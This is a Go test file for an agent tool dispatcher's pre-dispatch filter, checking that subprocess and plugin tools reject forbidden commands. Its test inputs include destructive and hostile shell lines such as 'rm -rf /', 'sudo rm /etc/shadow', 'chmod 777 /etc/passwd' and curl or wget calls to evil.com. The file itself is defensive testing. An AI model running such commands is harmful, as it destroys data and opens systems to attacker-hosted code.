package tools_test

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/caw/wrapper/internal/tools"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func newTestDispatcher(t *testing.T) (*tools.Dispatcher, *mockPGStore) {
	t.Helper()
	store := newMockPGStore()
	reg := tools.NewRegistry(store)
	sandbox := tools.NewSandbox(tools.SandboxConfig{MemLimitMB: 256, CPUShares: 512, TimeoutSec: 5})
	return tools.NewDispatcher(reg, sandbox), store
}

func TestDispatcher_BuiltinEcho_ReturnsInput(t *testing.T) {
	d, store := newTestDispatcher(t)
	ctx := context.Background()

	// Insert directly into store; registry.Get falls back to pg.GetTool on cache miss.
	store.CreateTool(ctx, tools.Tool{ //nolint:errcheck
		Name:         "echo",
		ExecutorType: "builtin",
		InputSchema:  json.RawMessage(`{}`),
		Enabled:      true,
	})

	input := json.RawMessage(`{"message":"hello"}`)
	result, err := d.Execute(ctx, tools.ToolCall{
		ID:       "call-1",
		ToolName: "echo",
		Input:    input,
	})
	require.NoError(t, err)
	assert.Equal(t, string(input), result.Output)
	assert.Empty(t, result.Error)
}

func TestDispatcher_HTTPExecutor_PostsToEndpoint(t *testing.T) {
	// Start a test HTTP server that echoes the request body.
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		w.WriteHeader(200)
		w.Write(body) //nolint:errcheck
	}))
	defer srv.Close()

	d, store := newTestDispatcher(t)
	ctx := context.Background()

	store.CreateTool(ctx, tools.Tool{ //nolint:errcheck
		Name:         "http-tool",
		ExecutorType: "http",
		EndpointURL:  srv.URL,
		InputSchema:  json.RawMessage(`{}`),
		Enabled:      true,
	})

	input := json.RawMessage(`{"key":"value"}`)
	result, err := d.Execute(ctx, tools.ToolCall{
		ID:       "call-2",
		ToolName: "http-tool",
		Input:    input,
	})
	require.NoError(t, err)
	assert.Empty(t, result.Error)
	assert.NotEmpty(t, result.Output)
}

func TestDispatcher_UnknownTool_ReturnsError(t *testing.T) {
	d, _ := newTestDispatcher(t)
	ctx := context.Background()

	_, err := d.Execute(ctx, tools.ToolCall{
		ID:       "call-3",
		ToolName: "nonexistent-tool",
		Input:    json.RawMessage(`{}`),
	})
	assert.Error(t, err)
}

// --- T8: preDispatchFilter tests ---

func registerTool(t *testing.T, store interface {
	CreateTool(context.Context, tools.Tool) (*tools.Tool, error)
}, name, execType string) {
	t.Helper()
	ctx := context.Background()
	store.CreateTool(ctx, tools.Tool{ //nolint:errcheck
		Name:         name,
		ExecutorType: execType,
		InputSchema:  json.RawMessage(`{}`),
		Enabled:      true,
	})
}

func TestPreDispatchFilter_BlocksChmod(t *testing.T) {
	d, store := newTestDispatcher(t)
	registerTool(t, store, "sub-chmod", "subprocess")
	_, err := d.Execute(context.Background(), tools.ToolCall{
		ID: "f1", ToolName: "sub-chmod",
		Input: json.RawMessage(`{"cmd":"chmod 777 /etc/passwd"}`),
	})
	require.Error(t, err)
	assert.True(t, errors.Is(err, tools.ErrForbiddenCommand))
}

func TestPreDispatchFilter_BlocksSudo(t *testing.T) {
	d, store := newTestDispatcher(t)
	registerTool(t, store, "sub-sudo", "subprocess")
	_, err := d.Execute(context.Background(), tools.ToolCall{
		ID: "f2", ToolName: "sub-sudo",
		Input: json.RawMessage(`{"cmd":"sudo rm /etc/shadow"}`),
	})
	require.Error(t, err)
	assert.True(t, errors.Is(err, tools.ErrForbiddenCommand))
}

func TestPreDispatchFilter_BlocksCurl(t *testing.T) {
	d, store := newTestDispatcher(t)
	registerTool(t, store, "sub-curl", "subprocess")
	_, err := d.Execute(context.Background(), tools.ToolCall{
		ID: "f3", ToolName: "sub-curl",
		Input: json.RawMessage(`{"cmd":"curl http://evil.com"}`),
	})
	require.Error(t, err)
	assert.True(t, errors.Is(err, tools.ErrForbiddenCommand))
}

func TestPreDispatchFilter_BlocksWget(t *testing.T) {
	d, store := newTestDispatcher(t)
	registerTool(t, store, "sub-wget", "subprocess")
	_, err := d.Execute(context.Background(), tools.ToolCall{
		ID: "f4", ToolName: "sub-wget",
		Input: json.RawMessage(`{"cmd":"wget http://evil.com"}`),
	})
	require.Error(t, err)
	assert.True(t, errors.Is(err, tools.ErrForbiddenCommand))
}

func TestPreDispatchFilter_BlocksRmRf(t *testing.T) {
	d, store := newTestDispatcher(t)
	registerTool(t, store, "sub-rmrf", "subprocess")
	_, err := d.Execute(context.Background(), tools.ToolCall{
		ID: "f5", ToolName: "sub-rmrf",
		Input: json.RawMessage(`{"cmd":"rm -rf /"}`),
	})
	require.Error(t, err)
	assert.True(t, errors.Is(err, tools.ErrForbiddenCommand))
}

func TestPreDispatchFilter_BlocksEval(t *testing.T) {
	d, store := newTestDispatcher(t)
	registerTool(t, store, "plug-eval", "plugin")
	_, err := d.Execute(context.Background(), tools.ToolCall{
		ID: "f6", ToolName: "plug-eval",
		Input: json.RawMessage(`{"cmd":"eval $(dangerous_cmd)"}`),
	})
	require.Error(t, err)
	assert.True(t, errors.Is(err, tools.ErrForbiddenCommand))
}

func TestPreDispatchFilter_BlocksBase64(t *testing.T) {
	d, store := newTestDispatcher(t)
	registerTool(t, store, "plug-b64", "plugin")
	_, err := d.Execute(context.Background(), tools.ToolCall{
		ID: "f7", ToolName: "plug-b64",
		Input: json.RawMessage(`{"cmd":"base64 decode payload"}`),
	})
	require.Error(t, err)
	assert.True(t, errors.Is(err, tools.ErrForbiddenCommand))
}

func TestPreDispatchFilter_AllowsBuiltin(t *testing.T) {
	d, store := newTestDispatcher(t)
	registerTool(t, store, "safe-builtin", "builtin")
	_, err := d.Execute(context.Background(), tools.ToolCall{
		ID: "f8", ToolName: "safe-builtin",
		Input: json.RawMessage(`{"cmd":"curl http://example.com"}`),
	})
	// builtins are exempt — ErrForbiddenCommand must NOT appear
	assert.False(t, errors.Is(err, tools.ErrForbiddenCommand))
}

func TestPreDispatchFilter_AllowsHTTP(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		w.WriteHeader(200)
		w.Write(body) //nolint:errcheck
	}))
	defer srv.Close()

	d, store := newTestDispatcher(t)
	store.CreateTool(context.Background(), tools.Tool{ //nolint:errcheck
		Name: "http-curl", ExecutorType: "http",
		EndpointURL: srv.URL, InputSchema: json.RawMessage(`{}`), Enabled: true,
	})
	_, err := d.Execute(context.Background(), tools.ToolCall{
		ID: "f9", ToolName: "http-curl",
		Input: json.RawMessage(`{"cmd":"curl http://example.com"}`),
	})
	// http executors are exempt — ErrForbiddenCommand must NOT appear
	assert.False(t, errors.Is(err, tools.ErrForbiddenCommand))
}

func TestPreDispatchFilter_AllowsSafeSubprocess(t *testing.T) {
	d, store := newTestDispatcher(t)
	registerTool(t, store, "sub-safe", "subprocess")
	_, err := d.Execute(context.Background(), tools.ToolCall{
		ID: "f10", ToolName: "sub-safe",
		Input: json.RawMessage(`{"cmd":"echo hello"}`),
	})
	// safe input — filter must NOT block it
	assert.False(t, errors.Is(err, tools.ErrForbiddenCommand))
}

func TestErrForbiddenCommand_IsTyped(t *testing.T) {
	d, store := newTestDispatcher(t)
	registerTool(t, store, "sub-typed", "subprocess")
	_, err := d.Execute(context.Background(), tools.ToolCall{
		ID: "f11", ToolName: "sub-typed",
		Input: json.RawMessage(`{"cmd":"chmod 600 /secret"}`),
	})
	require.Error(t, err)
	assert.True(t, errors.Is(err, tools.ErrForbiddenCommand), "errors.Is must resolve to ErrForbiddenCommand sentinel")
}
